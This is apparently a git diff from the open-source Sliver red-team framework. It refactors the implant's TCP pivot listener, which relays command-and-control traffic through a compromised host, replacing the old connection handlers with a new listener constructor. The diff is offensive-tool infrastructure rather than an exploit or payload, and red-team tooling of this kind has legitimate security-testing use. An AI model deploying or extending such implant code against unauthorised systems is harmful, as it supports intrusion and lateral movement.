@@ -19,123 +19,41 @@ package pivots
 */
 
 import (
+	"net"
+	"sync"
+	"time"
+
 	// {{if .Config.Debug}}
 	"log"
 	// {{end}}
-	"math/rand"
-	"net"
-	"time"
 
-	"github.com/bishopfox/sliver/implant/sliver/transports"
-	"github.com/bishopfox/sliver/protobuf/sliverpb"
-
-	"github.com/golang/protobuf/proto"
+	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 )
 
-// StartTCPListener - Start a TCP listener
-func StartTCPListener(address string) error {
+var (
+	tcpPivotReadDeadline  = 10 * time.Second
+	tcpPivotWriteDeadline = 10 * time.Second
+)
+
+// CreateTCPPivotListener - Start a TCP listener
+func CreateTCPPivotListener(address string, upstream chan<- *pb.Envelope, opts ...bool) (*PivotListener, error) {
 	// {{if .Config.Debug}}
-	log.Printf("Starting Raw TCP listener on %s", address)
+	log.Printf("Starting TCP pivot listener on %s", address)
 	// {{end}}
 	ln, err := net.Listen("tcp", address)
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Println(err)
+		log.Printf("[tcp-pivot] listener error: %s", err)
 		// {{end}}
-		return err
+		return nil, err
 	}
-	pivotListeners = append(pivotListeners, &PivotListener{
-		Type:          "tcp",
-		RemoteAddress: address,
-	})
-	go tcpPivotAcceptNewConnection(&ln)
-	return nil
-}
-
-func tcpPivotAcceptNewConnection(ln *net.Listener) {
-
-	for {
-		conn, err := (*ln).Accept()
-		if err != nil {
-			continue
-		}
-		rand.Seed(time.Now().UnixNano())
-		pivotID := rand.Uint32()
-		pivotsMap.AddPivot(pivotID, &conn, "tcp", conn.LocalAddr().String())
-		//SendPivotOpen(pivotID, "tcp", conn.LocalAddr().String(), transports.GetActiveConnection())
-
-		// {{if .Config.Debug}}
-		log.Println("Accepted a new connection")
-		// {{end}}
-
-		// handle connection like any other net.Conn
-		go tcpPivotConnectionHandler(&conn, pivotID)
+	pivotListener := &PivotListener{
+		ID:               ListenerID(),
+		Type:             pb.PivotType_TCP,
+		Listener:         ln,
+		PivotConnections: &sync.Map{},
+		BindAddress:      address,
+		Upstream:         upstream,
 	}
-}
-
-func tcpPivotConnectionHandler(conn *net.Conn, pivotID uint32) {
-
-	defer func() {
-		// {{if .Config.Debug}}
-		log.Printf("Cleaning up for pivot %d\n", pivotID)
-		// {{end}}
-		(*conn).Close()
-		pivotClose := &sliverpb.PivotClose{
-			PivotID: pivotID,
-		}
-		data, err := proto.Marshal(pivotClose)
-		if err != nil {
-			// {{if .Config.Debug}}
-			log.Println(err)
-			// {{end}}
-			return
-		}
-		connection := transports.GetActiveConnection()
-		if connection.IsOpen {
-			connection.Send <- &sliverpb.Envelope{
-				Type: sliverpb.MsgPivotClose,
-				Data: data,
-			}
-		}
-	}()
-
-	for {
-		envelope, err := PivotReadEnvelope(conn)
-		if err != nil {
-			// {{if .Config.Debug}}
-			log.Println(err)
-			// {{end}}
-			return
-		}
-
-		dataBuf, err1 := proto.Marshal(envelope)
-		if err1 != nil {
-			// {{if .Config.Debug}}
-			log.Println(err1)
-			// {{end}}
-			return
-		}
-		pivotData := &sliverpb.PivotData{
-			PivotID: pivotID,
-			Data:    dataBuf,
-		}
-		connection := transports.GetActiveConnection()
-		if envelope.Type == 1 {
-			SendPivotOpen(pivotID, dataBuf, connection)
-			continue
-		}
-		data2, err2 := proto.Marshal(pivotData)
-		if err2 != nil {
-			// {{if .Config.Debug}}
-			log.Println(err2)
-			// {{end}}
-			return
-		}
-		if connection.IsOpen {
-			connection.Send <- &sliverpb.Envelope{
-				Type: sliverpb.MsgPivotData,
-				Data: data2,
-			}
-		}
-	}
+	return pivotListener, nil
 }
